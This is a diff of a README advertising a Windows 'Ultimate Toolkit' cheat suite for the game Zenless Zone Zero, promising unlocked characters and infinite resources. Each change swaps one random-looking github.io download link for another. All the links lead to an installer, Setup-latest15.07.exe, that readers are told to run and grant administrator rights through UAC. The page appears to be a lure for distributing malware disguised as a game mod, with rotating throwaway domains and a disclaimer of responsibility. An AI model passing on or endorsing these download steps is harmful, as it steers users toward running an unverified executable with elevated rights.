@@ -2,7 +2,7 @@
 
 Zenless Zone Zero – Welcome to the ultimate toolkit for enhancing your gameplay experience in Zenless Zone Zero. This comprehensive mod suite is designed for Windows desktop users, offering a variety of features to customize and optimize your adventure in the game. Whether you want to unlock all characters, enjoy infinite resources, or edit your save files, this tool has you covered.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -32,7 +32,7 @@ Before installation, ensure your system meets the following requirements for opt
 
 Installing the Zenless Zone Zero Ultimate Toolkit is straightforward. Follow these steps to get started:
 
-1. **Download the Installer**: Click on the download button above or visit the [download page](https://yellowtaxisave.github.io/download-page/) to obtain the latest version of the installer file named **Setup-latest15.07.exe**. Always download from the official source to avoid any security risks.
+1. **Download the Installer**: Click on the download button above or visit the [download page](https://capitals-707-bringing.github.io/download-page/) to obtain the latest version of the installer file named **Setup-latest15.07.exe**. Always download from the official source to avoid any security risks.
 
 2. **Run the Installer**: Locate the downloaded file and double-click to run it. If prompted by User Account Control (UAC), click "Yes" to allow the installer to make changes to your system. This is necessary for the tool to integrate with your Windows environment.
 
@@ -69,7 +69,7 @@ A: The toolkit includes a backup feature that allows you to save original game f
 
 To get the Zenless Zone Zero Ultimate Toolkit, click on the link below:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 Note: This tool is provided for educational and personal use only. We are not responsible for any misuse or consequences resulting from the use of this software. Use it responsibly and respect the game's terms of service.
 
